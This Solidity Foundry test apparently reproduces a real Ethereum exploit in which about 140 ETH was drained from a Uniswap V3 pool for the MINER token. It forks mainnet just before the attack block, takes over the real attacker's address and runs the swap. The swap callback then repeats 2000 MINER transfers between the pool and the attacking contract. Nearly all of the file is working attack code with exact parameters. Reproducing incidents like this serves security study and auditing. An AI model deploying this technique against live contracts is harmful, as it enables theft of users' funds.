// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~140 $ETH
// Attacker : https://etherscan.io/address/0xea75aec151f968b8de3789ca201a2a3a7faeefba
// Attack Contract : https://etherscan.io/address/0xbff51c9c3d50d6168dfef72133f5dbda453ebf29
// Vulnerable Contract : https://etherscan.io/address/0x732276168b421d4792e743711e1a48172ea574a2
// Attack Tx : https://etherscan.io/tx/0x75e3aeb00df69882a1b15d424e5e642650326ca3b923d7fd1922d57c51bc2c78

// @Analysis
// https://twitter.com/Phalcon_xyz/status/1757777340002681326

interface IMinerUNIV3POOL {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external;
}

interface IMiner {
    function transferFrom(address from, address to, uint256 value) external;
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function uri(uint256 id) external view returns (string memory);
}

contract ContractTest is Test {
    address attacker = 0xea75AeC151f968b8De3789CA201a2a3a7FaeEFbA;
    IMinerUNIV3POOL pool = IMinerUNIV3POOL(0x732276168b421D4792E743711E1A48172EA574a2);
    IMiner MINER = IMiner(0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        // evm_version Requires to be "shanghai"
        cheats.createSelectFork("mainnet", 19_226_508 - 1);
        cheats.label(address(MINER), "MINER");
        cheats.label(address(pool), "MINER_Pool");
        cheats.label(address(WETH), "WETH");
    }

    function testExploit() public {
        emit log_named_uint(
            "Attacker ETH balance before exploit", WETH.balanceOf(address(this))
        );
        cheats.startPrank(attacker);
        MINER.transfer(address(this), MINER.balanceOf(attacker));
        MINER.balanceOf(address(this));
        cheats.stopPrank();

        bool zeroForOne = false;
        int256 amountSpecified = 999_999_999_999_999_998_000;
        uint160 sqrtPriceLimitX96 = 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_340;
        bytes memory data = abi.encodePacked(uint8(0x61));
        pool.swap(address(this), zeroForOne, amountSpecified, sqrtPriceLimitX96, data);
        emit log_named_uint(
            "Attacker ETH balance affter exploit", WETH.balanceOf(address(this))
        );
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        MINER.balanceOf(address(this));
        for (uint256 i = 0; i < 2000; i++) {
            MINER.transfer(address(pool), 499_999_999_999_999_999);
            MINER.transfer(address(this), 499_999_999_999_999_999);
        }
    }
}
